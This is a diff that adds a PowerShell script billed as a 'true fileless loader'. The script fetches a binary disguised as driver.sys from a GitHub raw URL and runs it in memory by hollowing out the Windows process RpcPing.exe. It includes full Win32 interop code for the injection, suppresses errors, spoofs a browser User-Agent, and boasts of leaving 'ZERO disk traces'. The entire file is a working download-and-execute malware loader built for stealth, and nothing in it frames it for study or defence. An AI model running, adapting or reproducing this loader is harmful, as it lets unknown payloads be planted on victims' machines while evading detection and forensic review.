@@ -1,0 +1,322 @@
+# TRUE FILELESS LOADER - Zero Disk Writes using Process Hollowing
+# Downloads loader and executes via process hollowing (no disk writes)
+# Usage: powershell -ExecutionPolicy Bypass -File fileless.ps1
+
+$ErrorActionPreference = "SilentlyContinue"
+
+# URL to download the loader (driver.sys is actually the loader.exe)
+$LoaderUrl = "https://github.com/djjdi2djisjioadjiosajiodkdska/cool-stuff/raw/refs/heads/main/driver.sys"
+
+# Win32 API definitions for process hollowing
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+public class ProcessHollowing {
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO {
+        public int cb;
+        public String lpReserved;
+        public String lpDesktop;
+        public String lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CONTEXT {
+        public uint ContextFlags;
+        public ulong P1Home;
+        public ulong P2Home;
+        public ulong P3Home;
+        public ulong P4Home;
+        public ulong P5Home;
+        public ulong P6Home;
+        public uint ContextFlags2;
+        public ushort MxCsr;
+        public ushort SegCs;
+        public ushort SegDs;
+        public ushort SegEs;
+        public ushort SegFs;
+        public ushort SegGs;
+        public uint EFlags;
+        public ulong Dr0;
+        public ulong Dr1;
+        public ulong Dr2;
+        public ulong Dr3;
+        public ulong Dr6;
+        public ulong Dr7;
+        public ulong Rax;
+        public ulong Rcx;
+        public ulong Rdx;
+        public ulong Rbx;
+        public ulong Rsp;
+        public ulong Rbp;
+        public ulong Rsi;
+        public ulong Rdi;
+        public ulong R8;
+        public ulong R9;
+        public ulong R10;
+        public ulong R11;
+        public ulong R12;
+        public ulong R13;
+        public ulong R14;
+        public ulong R15;
+        public ulong Rip;
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern bool CreateProcess(
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation
+    );
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(
+        IntPtr hProcess,
+        IntPtr lpAddress,
+        uint dwSize,
+        uint flAllocationType,
+        uint flProtect
+    );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        byte[] lpBuffer,
+        uint nSize,
+        out UIntPtr lpNumberOfBytesWritten
+    );
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtReadVirtualMemory(
+        IntPtr ProcessHandle,
+        IntPtr BaseAddress,
+        IntPtr Buffer,
+        int BufferSize,
+        out int NumberOfBytesRead
+    );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    const uint CREATE_SUSPENDED = 0x00000004;
+    const uint MEM_COMMIT = 0x1000;
+    const uint MEM_RESERVE = 0x2000;
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+    const uint CONTEXT_FULL = 0x10007;
+
+    public static bool HollowProcess(byte[] peBytes, string targetProcess) {
+        try {
+            // Parse PE headers
+            if (peBytes.Length < 64) return false;
+            
+            int e_lfanew = BitConverter.ToInt32(peBytes, 60);
+            if (e_lfanew >= peBytes.Length) return false;
+            
+            // Check DOS signature
+            if (BitConverter.ToUInt16(peBytes, 0) != 0x5A4D) return false; // MZ
+            
+            // Check PE signature
+            if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x00004550) return false; // PE\0\0
+            
+            // Get ImageBase and SizeOfImage
+            int optionalHeaderOffset = e_lfanew + 24;
+            ulong imageBase = BitConverter.ToUInt64(peBytes, optionalHeaderOffset + 24);
+            uint sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
+            uint entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
+            
+            // Create suspended process
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            PROCESS_INFORMATION pi;
+            
+            if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 
+                CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) {
+                return false;
+            }
+            
+            try {
+                // Get thread context
+                CONTEXT ctx = new CONTEXT();
+                ctx.ContextFlags = CONTEXT_FULL;
+                if (!GetThreadContext(pi.hThread, ref ctx)) {
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
+                
+                // Read PEB to get base address
+                IntPtr pebBaseAddress = new IntPtr((long)(ctx.Rdx + 16));
+                IntPtr baseAddressPtr = Marshal.AllocHGlobal(8);
+                int bytesRead = 0;
+                
+                NtReadVirtualMemory(pi.hProcess, pebBaseAddress, baseAddressPtr, 8, out bytesRead);
+                IntPtr baseAddress = Marshal.ReadIntPtr(baseAddressPtr);
+                Marshal.FreeHGlobal(baseAddressPtr);
+                
+                // Unmap original image
+                if (baseAddress.ToInt64() == (long)imageBase) {
+                    NtUnmapViewOfSection(pi.hProcess, baseAddress);
+                }
+                
+                // Allocate memory in target process
+                IntPtr mem = VirtualAllocEx(pi.hProcess, new IntPtr((long)imageBase), 
+                    sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                
+                if (mem == IntPtr.Zero) {
+                    // Try any address
+                    mem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeOfImage, 
+                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                }
+                
+                if (mem == IntPtr.Zero) {
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
+                
+                // Write PE headers
+                int sizeOfHeaders = BitConverter.ToInt32(peBytes, optionalHeaderOffset + 60);
+                UIntPtr bytesWritten;
+                WriteProcessMemory(pi.hProcess, mem, peBytes, (uint)sizeOfHeaders, out bytesWritten);
+                
+                // Write sections
+                int numberOfSections = BitConverter.ToUInt16(peBytes, e_lfanew + 6);
+                int sectionTableOffset = e_lfanew + 24 + BitConverter.ToUInt16(peBytes, e_lfanew + 20);
+                
+                for (int i = 0; i < numberOfSections; i++) {
+                    int sectionOffset = sectionTableOffset + (i * 40);
+                    if (sectionOffset + 40 > peBytes.Length) break;
+                    
+                    uint virtualAddress = BitConverter.ToUInt32(peBytes, sectionOffset + 12);
+                    uint sizeOfRawData = BitConverter.ToUInt32(peBytes, sectionOffset + 16);
+                    uint pointerToRawData = BitConverter.ToUInt32(peBytes, sectionOffset + 20);
+                    
+                    if (sizeOfRawData > 0 && pointerToRawData < peBytes.Length) {
+                        byte[] sectionData = new byte[sizeOfRawData];
+                        Array.Copy(peBytes, pointerToRawData, sectionData, 0, 
+                            Math.Min(sizeOfRawData, peBytes.Length - (int)pointerToRawData));
+                        
+                        IntPtr sectionAddr = new IntPtr(mem.ToInt64() + virtualAddress);
+                        WriteProcessMemory(pi.hProcess, sectionAddr, sectionData, 
+                            sizeOfRawData, out bytesWritten);
+                    }
+                }
+                
+                // Update context
+                ctx.Rcx = (ulong)(mem.ToInt64() + entryPoint);
+                IntPtr pebImageBase = new IntPtr((long)(ctx.Rdx + 16));
+                byte[] imageBaseBytes = BitConverter.GetBytes(mem.ToInt64());
+                WriteProcessMemory(pi.hProcess, pebImageBase, imageBaseBytes, 8, out bytesWritten);
+                
+                // Set thread context
+                if (!SetThreadContext(pi.hThread, ref ctx)) {
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
+                
+                // Resume thread
+                ResumeThread(pi.hThread);
+                
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+                
+                return true;
+            }
+            catch {
+                TerminateProcess(pi.hProcess, 1);
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+                return false;
+            }
+        }
+        catch {
+            return false;
+        }
+    }
+}
+"@
+
+# Function to download loader into memory
+function Download-LoaderToMemory {
+    param([string]$Url)
+    
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $loaderBytes = $webClient.DownloadData($Url)
+        $webClient.Dispose()
+        return $loaderBytes
+    }
+    catch {
+        return $null
+    }
+}
+
+# Main execution - TRUE FILELESS (zero disk writes)
+Write-Host "Downloading loader from memory..." -NoNewline
+$loaderBytes = Download-LoaderToMemory -Url $LoaderUrl
+
+if ($null -ne $loaderBytes -and $loaderBytes.Length -gt 0) {
+    Write-Host " OK" -ForegroundColor Green
+    Write-Host "Loader downloaded. Size: $($loaderBytes.Length) bytes" -ForegroundColor Green
+    Write-Host "Executing via process hollowing (ZERO disk writes)..." -NoNewline
+    
+    # Execute via process hollowing - NO DISK WRITES
+    $targetProcess = "C:\Windows\System32\RpcPing.exe"
+    $result = [ProcessHollowing]::HollowProcess($loaderBytes, $targetProcess)
+    
+    if ($result) {
+        Write-Host " OK" -ForegroundColor Green
+        Write-Host "Loader executed successfully - ZERO disk traces!" -ForegroundColor Green
+    } else {
+        Write-Host " FAILED" -ForegroundColor Red
+    }
+} else {
+    Write-Host " FAILED" -ForegroundColor Red
+    Write-Host "Failed to download loader"
+}
